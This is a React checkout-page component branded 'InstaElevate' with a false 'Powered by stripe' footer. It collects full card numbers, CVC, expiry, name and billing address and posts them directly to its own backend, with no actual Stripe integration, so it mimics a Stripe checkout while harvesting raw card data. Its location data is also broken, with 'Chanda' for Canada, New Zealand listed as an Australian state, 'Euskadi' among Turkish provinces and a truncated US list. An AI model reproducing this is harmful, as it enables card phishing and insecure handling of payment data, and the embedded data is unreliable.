import React, { useContext, useState } from "react";
import { IoIosArrowDown } from "react-icons/io";
import { Link } from "react-router-dom";
import axios from "axios"
import { MainContext } from "../Main";

const Card = () => {
  const { PaymentBaseUrl, BackendBaseUrl } = useContext(MainContext)
  const [contry, SetContry] = useState("United States")
  const [Province, SetProvince] = useState("null")



  const menu = [
    {
      name: "india",
      stateTage: "State",
      state: [
        {
          stateName: "Andhra Pradesh",
        },
        {
          stateName: "Arunachal Pradesh",
        },
        {
          stateName: "Assam",
        },
        {
          stateName: "Bihar",
        },
        {
          stateName: "Chhattisgarh",
        },
        {
          stateName: "Goa",
        },
        {
          stateName: "Gujarat",
        },
        {
          stateName: "Haryana",
        },
        {
          stateName: "Jharkhand",
        },
        {
          stateName: "Karnataka",
        },
        {
          stateName: "Madhya Pradesh",
        },
        {
          stateName: "Maharashtra",
        },
        {
          stateName: "Manipur",
        },
        {
          stateName: "Meghalaya",
        },
        {
          stateName: "Nagaland",
        },
        {
          stateName: "Odisha",
        },
        {
          stateName: "Punjab",
        },
        {
          stateName: "Rajasthan",
        },
        {
          stateName: "Sikkim",
        },
        {
          stateName: "Tamil Nadu",
        },
        {
          stateName: "Telangana",
        }, {
          stateName: "Tripura",
        },
        {
          stateName: "Uttarakhand",
        },
        {
          stateName: "Uttar Pradesh",
        },
        {
          stateName: "West Bengal",
        },
        {
          stateName: "Chandigarh",
        },
      ]
    },
    {
      name: "United States",
      StateTag: "State",
      state: [
        {
          stateName: "Alabama",
        },
        {
          stateName: "Alaska",
        },
        {
          stateName: "Arizona",
        },
        {
          stateName: "Arkansas",
        },
        {
          stateName: "California",
        },
        {
          stateName: "Colorado",
        },
        {
          stateName: "Connecticut",
        },
        {
          stateName: "Delaware",
        },
        {
          stateName: "Florida",
        },
        {
          stateName: "Georgia",
        },
        {
          stateName: "Hawaii",
        },
        {
          stateName: "Idaho",
        },
        {
          stateName: "Illinois",
        },
        {
          stateName: "Indiana",
        },
        {
          stateName: "Iowa",
        },
      ]
    },
    {
      name: "Australia",
      stateTage: "State",
      state: [
        {
          stateName: "New South Wales",
        },
        {
          stateName: "Victoria",
        },
        {
          stateName: "Queensland",
        },
        {
          stateName: "South Australia",
        },
        {
          stateName: "Tasmania",
        },
        {
          stateName: "Western Australia",
        },
        {
          stateName: "Australian Capital Territory",
        },
        {
          stateName: "Northern Territory",
        },
        {
          stateName: "New Zealand",
        },
      ]
    },
    {
      name: "Chanda",
      stateTag: "Province",
      state: [
        {
          stateName: "Alberta",
        },
        {
          stateName: "British Columbia",
        },
        {
          stateName: "Manitoba",
        },
        {
          stateName: "New Brunswick",
        },
        {
          stateName: "Newfoundland and Labrador",
        },
        {
          stateName: "Northwest Territories",
        },
        {
          stateName: "Nova Scotia",
        },
        {
          stateName: "Ontario",
        },
        {
          stateName: "Prince Edward Island",
        },
        {
          stateName: "Quebec",
        },
        {
          stateName: "Saskatchewan",
        },
        {
          stateName: "Yukon",
        }
      ]
    },
    {
      name: "Monaco",
      stateTag: null,
      state: null
    },
    {
      name: "Luxembourg",
      state: null,
      stateTag: null
    },
    {
      name: "Turkey",
      stateTag: "Province",
      state: [
        {
          stateName: "Adana",
        },
        {
          stateName: "Adıyaman",
        },
        {
          stateName: "Afyonkarahisar",
        },
        {
          stateName: "Ağrı",
        },
        {
          stateName: "Aksaray",
        },
        {
          stateName: "Amasya",
        },
        {
          stateName: "Ankara",
        },
        {
          stateName: "Antalya",
        },
        {
          stateName: "Ardahan",
        },
        {
          stateName: "Artvin",
        },
        {
          stateName: "Aydın",
        },
        {
          stateName: "Balıkesir",
        },
        {
          stateName: "Bilecik",
        },
        {
          stateName: "Bingöl",
        },
        {
          stateName: "Bolu",
        },
        {
          stateName: "Burdur",
        },
        {
          stateName: "Bursa",
        },
        {
          stateName: "Çanakkale",
        },
        {
          stateName: "Çankırı",
        },
        {
          stateName: "Çorum",
        },
        {
          stateName: "Denizli",
        },
        {
          stateName: "Diyarbakır",
        },
        {
          stateName: "Edirne",
        },
        {
          stateName: "Elazığ",
        },
        {
          stateName: "Erzincan",
        },
        {
          stateName: "Eskişehir",
        },
        {
          stateName: "Euskadi",
        },
        {
          stateName: "Fethiye",
        },
        {
          stateName: "Gaziantep",
        },
        {
          stateName: "Giresun",
        },
        {
          stateName: "Gümüşhane",
        },
        {
          stateName: "Hakkari",
        },
        {
          stateName: "Hatay",
        },
        {
          stateName: "Istanbul",
        },
        {
          stateName: "Izmir",
        },
        {
          stateName: "Kahramanmaraş",
        },
        {
          stateName: "Kars",
        },
        {
          stateName: "Kilis",
        },
        {
          stateName: "Kırıkkale",
        },
        {
          stateName: "Kocaeli",
        },
        {
          stateName: "Konya",
        },
        {
          stateName: "Kütahya",
        },
        {
          stateName: "Malatya",
        },
        {
          stateName: "Manisa",
        },
        {
          stateName: "Mardin",
        },
        {
          stateName: "Nevşehir",
        },
        {
          stateName: "Niğde",
        },
        {
          stateName: "Ordu",
        },
        {
          stateName: "Rize",
        },
        {
          stateName: "Sakarya",
        },
        {
          stateName: "Samsun",
        },
        {
          stateName: "Siirt",
        },
        {
          stateName: "Sinop",
        },
        {
          stateName: "Sivas",
        },
        {
          stateName: "��anlıurfa",
        },
        {
          stateName: "Tekirdağ",
        },
        {
          stateName: "Tokat",
        },
        {
          stateName: "Trabzon",
        },
        {
          stateName: "Tunceli",
        },
        {
          stateName: "Uşak",
        },
        {
          stateName: "Van",
        },
        {
          stateName: "Yalova",
        },
        {
          stateName: "Yozgat",
        },
        {
          stateName: "Zonguldak",
        }
      ]
    },
    {
      name: "United Kingdom",
      stateTag: null,
      state: null
    },
    {
      name: "FRANCE",
      state: null,
      stateTag: null
    },
    {
      name: "Portugal",
      stateTag: null,
      state: null
    },
    {
      name: "Belgium",
      state: null,
      stateTag: null
    }

  ]

  const FormSubmitHandler = (e) => {
    e.preventDefault()

    const data = {
      email: e.target.email.value,
      country: contry,
      state: Province,
      city: e.target.city.value,
      Firstaddress: e.target.adressFirst.value,
      Secondaddress: e.target.adressSecond.value,
      postalcode: e.target.postal?.value,
      AtmNumber: e.target.Atm.value,
      amount: e.target.price.value,
      expiry: e.target.expiry.value,
      Cvc: e.target.cvc.value,
      Cardholder: e.target.Cardholder.value,
      pin: e.target.pin?.value,
      zip: e.target.zip?.value,
      cedex: e.target.cedex?.value,
      district: e.target.district?.value,
    }
    axios.post(BackendBaseUrl + PaymentBaseUrl, data)
      .then((success) => {
        if (success.data.status === 1) {
          e.target.reset()
          alert('Payment Successful')
        } else {
          alert('Payment Failed please try again')
        }
      }).catch((err) => {
        console.log(err)
        alert('Payment Failed')
      })


  }
  return (
    <div className="">
      <div className="flex justify-between w-full h-14 z-50 border-b px-3 -mt-20 fixed bg-white">
        <div className="flex gap-2.5 items-center">
          <div className="bg-white shadow-md rounded-full w-7 h-7 flex items-center justify-center">
            <svg
              className="InlineSVG Icon HeaderImage-fallbackIcon Icon--sm w-3 h-3   "
              focusable="false"
              viewBox="0 0 16 16"
            >
              <path
                d="M3 7.5V12h10V7.5c.718 0 1.398-.168 2-.468V15a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V7.032c.602.3 1.282.468 2 .468zM0 3L1.703.445A1 1 0 0 1 2.535 0h10.93a1 1 0 0 1 .832.445L16 3a3 3 0 0 1-5.5 1.659C9.963 5.467 9.043 6 8 6s-1.963-.533-2.5-1.341A3 3 0 0 1 0 3z"
                fillRule="evenodd"
              />
            </svg>
          </div>

          <h1 className="text-sm font-normal text-gray-700">InstaElevate</h1>
        </div>
        <div className="flex gap-2 items-center text-xs text-gray-500">
          <h1 className="border-dotted border-b-2 border-gray-400	">Details</h1>
          <h1>
            <IoIosArrowDown className="mt-1" />
          </h1>
        </div>
      </div>
      <div className="flex flex-col justify-center mt-20 mx-3  ">
        <h1 className="text-center my-0.5 text-gray-600">InstaElevate</h1>
        <form className="flex flex-col mt-5 " action="" onSubmit={FormSubmitHandler}>
          <input required id="number"
            className="shadow-sm py-1 border rounded-md text-center text-2xl font-medium outline-[3.5px]  focus:outline focus:outline-blue-200   focus:border-blue-400"
            type="Number"
            name="price"
            placeholder="US$0.00"
          />

          <label className=" my-1 text-gray-500 text-[12px] mt-10	" htmlFor="">
            Email
          </label>
          <input required
            className="shadow-sm border rounded-md outline-none  px-3  text-xl font-bold py-1.5 outline-[3.5px]  focus:outline focus:outline-blue-200   focus:border-blue-400"
            type="email"
            name="email"
          />
          <label className=" mt-3 my-1 text-gray-500 text-[12px]	" htmlFor="">
            Card information
          </label>
          <div className="w-full relative flex items-center justify-end">
            <input required
              className="border-b-0 w-full border rounded-t-md outline-none  px-3  text-sm	 py-2.5 outline-[3.5px]  focus:outline focus:outline-blue-200   focus:border-blue-400"
              placeholder="1234 1234 1234 1234"
              type="text"
              name="Atm"
            />
            <img
              className="absolute h-3.5 mr-10	"
              src="src/assets/Img/visa.png"
              alt=""
            />
            <img
              className="absolute h-3.5 mr-3 "
              src="src/assets/Img/mastercard.png"
              alt=""
            />
          </div>
          <div className="flex ">
            <div className="w-full">
              <input required
                className="border-r-0 text-sm shadow-sm w-full border rounded-es-md outline-none  px-3   py-2.5"
                placeholder="MM / YY"
                type="text"
                name="expiry"
              />
            </div>
            <div className="flex w-full items-center justify-end relative">
              <input required
                className="text-sm  shadow-sm w-full border rounded-ee-md outline-none  px-3   py-2.5"
                placeholder="CVC"
                type="Number"
                name="cvc"
              />
              <img
                className=" absolute h-3.5 mr-3"
                src="src/assets/Img/cvc.png"
                alt=""
              />
            </div>
          </div>
          <label className=" mt-3 my-1 text-gray-500 text-[12px]	" htmlFor="">
            Cardholder name
          </label>
          <input required
            className="shadow-sm text-sm w-full border rounded-md outline-none  px-3   py-2.5"
            placeholder="Full name on card"
            type="text"
            name="Cardholder"

          />
          <label className=" mt-3 my-1 text-gray-500 text-[12px]	" htmlFor="">
            Billing address
          </label>
          <select name="" id="" onChange={(e) => SetContry(e.target.value)} defaultValue={null} className="border-b-0 text-sm w-full border rounded-t-md outline-none  px-3 py-2.5 text-gray-600">
            {
              menu.map((item, i) => {
                return (
                  <option key={i} value={item.value}>{item.name}</option>
                )
              })
            }
          </select>
          {
            contry === "india" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 border-r-0 text-sm w-full border  outline-none  px-3   py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                    placeholder="PIN"
                    type="Number"
                    id="number"
                    name="pin"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "United States" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 border-r-0 text-sm w-full border  outline-none  px-3   py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                    placeholder="ZIP"
                    type="text"
                    name="zip"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "Australia" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Suburb or city"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal Code"
                    type="text"
                    name="postal"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "Chanda" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="city"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal Code"
                    type="text"
                    name="postal"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "Monaco" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal Code"
                    type="text"
                    name="postal"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
              </div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="CEDEX"
                type="text"
                name="cedex"
              />
            </div>
          }
          {
            contry === "Luxembourg" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal Code"
                    type="text"
                    name="postal"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "Turkey" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal Code"
                    type="text"
                    name="postal"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="District"
                    type="text"
                    name="district"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "United Kingdom" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Town or City"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal code"
                    type="text"
                    name="postal"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "FRANCE" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal code"
                    type="text"
                    name="postal"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "Portugal" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal code"
                    type="text"
                    name="postal"
                  />
                </div>
              </div>
            </div>
          }
          {
            contry === "Belgium" &&
            <div>
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3   py-2.5"
                placeholder="Address line 1"
                type="text"
                name="adressFirst"
              />
              <input required
                className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                placeholder="Address line 2"
                type="text"
                name="adressSecond"
              />
              <div className="flex">
                <div className="w-full">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="City"
                    type="text"
                    name="city"
                  />
                </div>
                <div className=" w-full flex items-center justify-end relative">
                  <input required
                    className="border-b-0 text-sm w-full border  outline-none  px-3  py-2.5"
                    placeholder="Postal code"
                    type="text"
                    name="postal"
                  />
                </div>
              </div>
            </div>
          }
          {menu.filter((item) => item.name === contry).some((item) => item.state && item.state.length > 0) && (
            <select
              name=""
              id=""
              onChange={(e) => {
                SetProvince(e.target.value);
              }}
              className="border-b-0 text-sm w-full border outline-none px-3 py-2.5 text-gray-600"
            >
              {menu
                .filter((item) => item.name === contry)
                .map((item) =>
                  item.state?.map((state, i) => (
                    <option key={i} value={state.stateName}>
                      {state.stateName}
                    </option>
                  ))
                )}
            </select>
          )}
          <button className="shadow-sm border rounded-md outline-none text-center  text-lg text-sky-400 font-semibold py-2 mt-7 bg-sky-600">
            Pay
          </button>
        </form>
        <div className="w-full h-40 mt-4 flex flex-col justify-center items-center">
          <div className="flex items-center  ">
            <h1 className="text-gray-500 text-[11px]	">Powered by </h1>
            <span className="ml-1 font-bold -mt-0.5 text-gray-500 text-[13px]	">
              stripe
            </span>
          </div>
          <h1 className="text-gray-500 text-[11px]	mt-2">Terms Privacy</h1>
        </div>
      </div>
    </div>
  );
};

export default Card;
